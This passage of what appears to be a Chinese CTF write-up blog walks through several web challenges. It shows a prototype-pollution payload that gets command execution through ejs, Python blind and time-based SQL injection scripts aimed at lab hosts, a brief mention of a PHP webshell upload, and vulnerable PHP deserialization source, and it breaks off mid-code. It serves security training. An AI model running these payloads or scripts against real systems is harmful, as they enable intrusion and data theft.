res</span>) </span>&#123;</span><br><span class=\"line\">  res.render(<span class=\"string\">'index'</span>,data=&#123;<span class=\"string\">'user'</span>:res.outputFunctionName&#125;);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p><code>/action</code>代码对post传入的数据进行了clone操作,触发原型链污染。render造成代码执行<a href=\"[https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/](https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/)\">参考链接</a></p>\n<p>传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/action</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: session=s%3AG1zgVNFpJSA-czxyV6IyZ_mCJSStbn_6.Tw40woUQYqkMMTqBQl2SDs8Td0Og%2FepP2NS%2FT24zFK8</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 133</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"__proto__\":&#123;\"outputFunctionName\": \"a;global.process.mainModule.require('child_process').exec('cat /flag &gt; /app/public/a.txt');//\"&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问/info触发代码执行</p>\n<p><img src=\"/pic/129.png\" alt=\"\"></p>\n<p>访问/a.txt得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;6d73d1f0-0865-44c3-9851-4e6f38dd58be&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>参考链接：<a href=\"https://www.zhaoj.in/read-6462.html\" target=\"_blank\" rel=\"noopener\">https://www.zhaoj.in/read-6462.html</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"简单的招聘系统\"><a href=\"#简单的招聘系统\" class=\"headerlink\" title=\"简单的招聘系统\"></a>简单的招聘系统</h1><p>打开题目是一个登入界面，是NULL的大佬出的题目</p>","more":"<p><img src=\"/pic/107.png\" alt=\"\"></p>\n<p>简单的注册admin,admin登入，发现在Profile界面发现存在<del>xss</del>slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。</p>\n<p>实在是想不到怎么办。</p>\n<p>后面想到登入界面可能存在注入,经过测试确实存在sql注入</p>\n<p><img src=\"/pic/109.png\" alt=\"\"></p>\n<p>编写脚本，在里面有坑，编码不一样</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 1/30/2020 9:42 PM</span></span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">def get(payload):</span><br><span class=\"line\">    url = <span class=\"string\">'http://3f5788fc3e0d4cd29c4857bd75a3087e9c2af7a010664d15.changame.ichunqiu.com/index.php'</span></span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"string\">'lname'</span> : <span class=\"string\">'admin\\' and '</span>+payload+<span class=\"string\">'#'</span>,</span><br><span class=\"line\">        <span class=\"string\">'lpass'</span> : <span class=\"string\">'admin'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cookies=&#123;</span><br><span class=\"line\">        <span class=\"string\">'PHPSESSID'</span> : <span class=\"string\">'bbvvjmdnv20oa9vpub65s4bkr4'</span>,</span><br><span class=\"line\">        <span class=\"string\">'__jsluid_h'</span> : <span class=\"string\">'a36781563be2b33ed295cec9257f1621'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html = requests.post(url,data=data,cookies=cookies)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\">def binsea(s_payload,len=<span class=\"number\">999</span>):</span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print('*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'window.location.href=\"./zhaopin.php\"'</span> in html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">def get_database():</span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(database)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_tabls(db):</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''</span>+db+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_columns(table):</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''</span>+table+<span class=\"string\">'\\')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\">def get_data(columns,table):</span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #nzhaopin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tabls('nzhaopin') #backup,flag,user</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_columns('flag') #id,flaaag</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'flaaag'</span>,<span class=\"string\">'flag'</span>) <span class=\"comment\">#flag&#123;04418836-27b8-4f85-8c53-74f7e3e53350&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ezupload\"><a href=\"#ezupload\" class=\"headerlink\" title=\"ezupload\"></a>ezupload</h1><p>直接上传php后缀，一句话木马，蚁剑链接，执行/readflag</p>\n<h1 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"comment\"># flag在fl4g里</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">'waf.php'</span>;</span><br><span class=\"line\">    header(<span class=\"string\">\"Content-type: text/html; charset=utf-8\"</span>); </span><br><span class=\"line\">    $db = <span class=\"keyword\">new</span> mysql();</span><br><span class=\"line\"></span><br><span class=\"line\">    $id = $_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($id) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(check_sql($id))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $sql = <span class=\"string\">\"select * from flllllllag where id=$id\"</span>;</span><br><span class=\"line\">            $db-&gt;query($sql);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>题目给出了源码，经过测试过滤了如下字符</p>\n<p><img src=\"/pic/110.png\" alt=\"\"></p>\n<p>附上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://c4c11f9e99ba4142b9bfc8ed760a65a985f476a30a93485e.changame.ichunqiu.com/?id=0||'</span>+payload+<span class=\"string\">'%23'</span></span><br><span class=\"line\">    html = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"comment\"># return html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    result=<span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">70</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">126</span>):</span><br><span class=\"line\">            payload=<span class=\"string\">\"if(ascii(substr(fl4g, %d, 1)) ^ %d, sleep(0), sleep(2))\"</span> %(x,c)</span><br><span class=\"line\">            time1 = time.time()</span><br><span class=\"line\">            get(payload)</span><br><span class=\"line\">            time2 = time.time()</span><br><span class=\"line\">            sec = time2 - time1</span><br><span class=\"line\">            <span class=\"comment\"># print(sec,' ',chr(c))</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> sec &gt;=<span class=\"number\">1.5</span>:</span><br><span class=\"line\">                result+=chr(c)</span><br><span class=\"line\">                print(result)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ ==<span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"babyphp\"><a href=\"#babyphp\" class=\"headerlink\" title=\"babyphp\"></a>babyphp</h1><p>打开还是一个登入界面，访问<a href=\"http://www.zip发现源码\" target=\"_blank\" rel=\"noopener\">www.zip发现源码</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"lib.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'action'</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"keyword\">__DIR__</span>.<span class=\"string\">\"/\"</span>.$_GET[<span class=\"string\">'action'</span>].<span class=\"string\">\".php\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'login'</span>]==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//lib.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span><span class=\"params\">($parm)</span></span>&#123;</span><br><span class=\"line\">    $array= <span class=\"keyword\">array</span>(<span class=\"string\">'union'</span>,<span class=\"string\">'regexp'</span>,<span class=\"string\">'load'</span>,<span class=\"string\">'into'</span>,<span class=\"string\">'flag'</span>,<span class=\"string\">'file'</span>,<span class=\"string\">'insert'</span>,<span class=\"string\">\"'\"</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"alter\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace($array,<span class=\"string\">'hacker'</span>,$parm);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>])&amp;&amp;<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">        $mysqli=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;id=$mysqli-&gt;login(<span class=\"string\">'select id,password from user where username=?'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;id)&#123;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'id'</span>]=<span class=\"keyword\">$this</span>-&gt;id;  </span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'login'</span>]=<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"你的ID是\"</span>.$_SESSION[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"你好！\"</span>.$_SESSION[<span class=\"string\">'token'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;id;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $Info=unserialize(<span class=\"keyword\">$this</span>-&gt;getNewinfo());</span><br><span class=\"line\">        $age=$Info-&gt;age;</span><br><span class=\"line\">        $nickname=$Info-&gt;nickname;</span><br><span class=\"line\">        $updateAction=<span class=\"keyword\">new</span> UpdateHelper($_SESSION[<span class=\"string\">'id'</span>], $Info, <span class=\"string\">\"update user SET age=$age,nickname=$nickname where id=\"</span>.$_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//这个功能还没有写完 先占坑</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNewInfo</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $age=$_POST[<span class=\"string\">'age'</span>];</span><br><span class=\"line\">        $nickname=$_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> safe(serialize(<span class=\"keyword\">new</span> Info($age,$nickname)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;nickname);<span class=\"comment\">//危</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname-&gt;update(<span class=\"keyword\">$this</span>-&gt;age);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"0-0\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nickname;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $CtrlCase;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($age,$nickname)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age=$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nickname=$nickname;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name,$argument)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">UpdateHelper</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $newinfo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $sql;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($newInfo,$sql)</span></span>&#123;</span><br><span class=\"line\">        $newInfo=unserialize($newInfo);</span><br><span class=\"line\">        $upDate=<span class=\"keyword\">new</span> dbCtrl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    